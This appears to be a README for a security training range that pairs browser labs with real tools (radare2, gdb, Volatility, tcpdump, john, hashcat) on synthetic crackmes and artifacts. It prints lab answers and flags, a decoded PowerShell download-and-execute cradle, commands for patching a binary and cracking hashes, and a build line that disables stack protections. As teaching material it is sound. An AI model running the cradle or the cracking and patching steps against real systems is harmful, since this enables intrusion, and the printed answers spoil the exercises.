# BLACKVAULT // Range — real-tool companion

The **Range** tab inside `blackvault-study-console.html` is a *trainer*: it simulates the tools in
your browser so you can learn the moves with zero setup. This folder holds the **real artifacts**
those labs are modelled on, so you can run the exact workflow with the exact tools you'll use on the job.

> All of this is **defensive / educational**: synthetic samples, intentionally-vulnerable crackmes,
> and a fabricated memory blob. Nothing here is live malware.

---

## 1. RE Bench  →  real `radare2` / `gdb` / `objdump`

The three crackmes here are the real twins of the three browser levels. Same answers:
`letmein`, `pwnage`, `40000008`.

```bash
cd crackmes
make            # builds stripped, no-symbol ELF binaries (reverse them like real samples)
```

### Level 1 — plaintext compare (`crackme1`)
The password sits in `.rodata`. The browser bench shows you the `lea rsi, [...] ; "letmein"` move —
here you find it for real:
```bash
strings crackme1 | less                 # the cheap win
r2 -q -c 'iz' crackme1                   # list strings from radare2
r2 -A crackme1                           # then:  s main ; pdf     (or 'pdc' for pseudo-C)
./crackme1 letmein                       # -> ACCESS GRANTED
```

### Level 2 — XOR gate (`crackme2`)
A 6-byte key `{43 44 5d 52 54 56}` is in the binary; each input byte is `^ 0x33` then compared.
XOR is its own inverse, so `password[i] = key[i] ^ 0x33`.
```bash
r2 -A crackme2          # find the loop in 'pdf'; look for  'xor ... 0x33'  and the cmp
                        # px @ <addr of key>  to dump the key bytes
python3 -c 'print(bytes(b^0x33 for b in [0x43,0x44,0x5d,0x52,0x54,0x56]).decode())'   # -> pwnage
./crackme2 pwnage       # -> ACCESS GRANTED
```

### Level 3 — keygen (`crackme3`)
No stored password. Read the algorithm in the disassembly, then *write a generator*.
Rules: 8 digits, first digit `4`, and `Σ digit[i]*(i+1)` divisible by 17.
```bash
r2 -A crackme3          # read the loop:  sub 0x30 ; imul (i+1) ; add sum ; ... ; cmp ... ; 'cmp byte [s], 0x34'
# keygen one-liner:
python3 - <<'PY'
for n in range(40000000,50000000):
    s=str(n)
    if sum(int(c)*(i+1) for i,c in enumerate(s))%17==0:
        print("serial:",s); break
PY
./crackme3 40000008     # -> VALID SERIAL
```

### Patching (the browser "click the red jump" move, for real)
Find the conditional jump that guards the success path and flip/NOP it:
```bash
objdump -d -M intel crackme1 | grep -n -E 'jne|je|test'   # locate the gate
gdb ./crackme1                                            # dynamic: break before the cmp, set the
  #   (gdb) starti                                          flag/register so the jump isn't taken,
  #   (gdb) ...                                             or patch the byte in radare2 write mode:
r2 -w crackme1            # s <addr of jne> ; "wa nop;nop"  (then run — any input passes)
```

---

## 2. Memory Triage  →  real `strings` / `xxd` / `grep` / `base64`

`memory-sample.raw` is a 512 KB blob with realistic artifacts scattered through random noise —
the same scenario as the browser memory lab (a process lying about its identity).

```bash
strings -n 6 memory-sample.raw | grep -Ei 'svch0st|telemetry|185\.220|exfil'   # carve IOCs
xxd memory-sample.raw | grep -i telemetry                                       # find the offset
strings memory-sample.raw | grep -i 'enc '                                      # the PowerShell cradle
echo 'QlZ7bTNtMHJ5X2QwbnRfbDEzfQ==' | base64 -d        # -> the flag
# decode the -enc PowerShell:
echo 'SUVY...PQ==' | base64 -d                          # -> IEX (New-Object Net.WebClient).DownloadString(...)
```
**Real-world next step:** on an actual RAM image you'd use **Volatility 3**
(`pip install volatility3`) — `windows.pslist`, `windows.pstree`, `windows.netscan`,
`windows.malfind`, `windows.cmdline`. The browser lab teaches that exact plugin vocabulary.

---

## 3. DNS Exfil Hunt  →  real `tcpdump` / Wireshark

This lab stays in the browser (crafting a real `.pcap` needs a capture). To practice for real:
generate traffic on a lab box and read it back —
```bash
sudo tcpdump -i any -w capture.pcap 'udp port 53'      # capture DNS
tcpdump -r capture.pcap -n 'udp port 53'               # read queries
# in Wireshark, the display filters map 1:1 to the browser lab's filter bar:
#   dns        ·    ip.addr == 10.0.2.15    ·    dns.qry.name contains telemetry
```
The tell is unchanged: one host firing many A-record lookups to one parent domain, long
high-entropy left-most labels, a sequence counter. (This is exactly what your `dns filter`
project should be scoring against.)

---

## 4. Log Triage  →  real `grep` / `awk` / `journalctl`

The browser lab's filter bar is a stand-in for the shell. The real muscle memory:
```bash
grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn  # top brute IPs
grep 'Accepted password' /var/log/auth.log                                                    # who got in
awk '$9>=200 && /cmd=/' /var/log/nginx/access.log                                              # web-shell hits
```

---

## 5. The other Range labs → their real tools

The console's **Range** tab now has 13 labs. The browser is the trainer; here's the real tool each one
graduates you to, plus the artifacts in this folder for the new categories.

| Browser lab            | Real tool / next step                                              | Artifact here |
|------------------------|-------------------------------------------------------------------|---------------|
| Crypto Workbench       | **CyberChef**, `python`, `openssl`                                 | `crypto/ciphertexts.txt` |
| Web Exploitation       | **Burp Suite**, `sqlmap`, DVWA / OWASP Juice Shop (your own lab)   | — (use a deliberately vuln app you host) |
| PE Static Triage       | `pefile`, **Detect It Easy (DiE)**, `floss`, `yara`, `upx -d`      | reuse `crackmes/` + `readelf`/`r2` for ELF equivalents |
| Stego & Carving        | `binwalk`, `foremost`, `exiftool`, `zsteg`, `unzip`               | `stego/carve_me.bin` |
| Stack Overflow         | `gdb` + **GEF/pwndbg**, **pwntools**, `checksec`, `ROPgadget`      | build your own: `gcc -fno-stack-protector -z execstack` |
| Linux Privesc          | **GTFOBins**, `linpeas.sh`, `pspy`, `sudo -l`                      | (run on a throwaway VM) |
| Hash Cracking          | **john** (`john --wordlist=...`), **hashcat** (`-m 0`), `hashid`  | `hashcrack/hashes.txt`, `hashcrack/wordlist.txt` |
| Phishing Triage        | `mha` / message-header analyzers, `dig` (SPF/DMARC), `urlscan.io`  | inspect any `.eml` with a text editor |
| Threat Intel           | **MITRE ATT&CK Navigator**, MISP, `iocextract`                     | — |

### Run the new real artifacts
```bash
# crypto — decode each line (or paste into CyberChef)
cat crypto/ciphertexts.txt

# hash cracking — the real thing if you have john/hashcat:
john --format=raw-md5 --wordlist=hashcrack/wordlist.txt hashcrack/hashes.txt
hashcat -m 0 -a 0 hashcrack/hashes.txt hashcrack/wordlist.txt
#   ...or with no tools installed:
python3 -c 'import hashlib;w=[x.strip() for x in open("hashcrack/wordlist.txt")];[print(h[:8],"->",p) for h in (l.strip() for l in open("hashcrack/hashes.txt")) for p in w if hashlib.md5(p.encode()).hexdigest()==h]'

# stego carving — there is a real ZIP appended after the file's "EOF":
binwalk stego/carve_me.bin      # if installed — shows the embedded Zip archive
unzip -p stego/carve_me.bin     # works right now: prints the carved flag
```

> A note on **Stack Overflow / pwn**: modern compilers enable a stack canary, NX, PIE and ASLR by
> default, so the textbook overwrite won't "just work" on a stock `gcc` build — that's the point the
> browser lab's concept-check makes. To reproduce the classic exploit on purpose:
> `gcc -fno-stack-protector -z execstack -no-pie -O0 vuln.c -o vuln`, then drive it with **pwntools**.

---

### Suggested loop
1. Do the lab in the **browser** (fast feedback, hints, scored objectives).
2. Redo the **same lab here with the real tool** — no hints.
3. When the real tool feels natural, you've actually learned it, not just read about it.
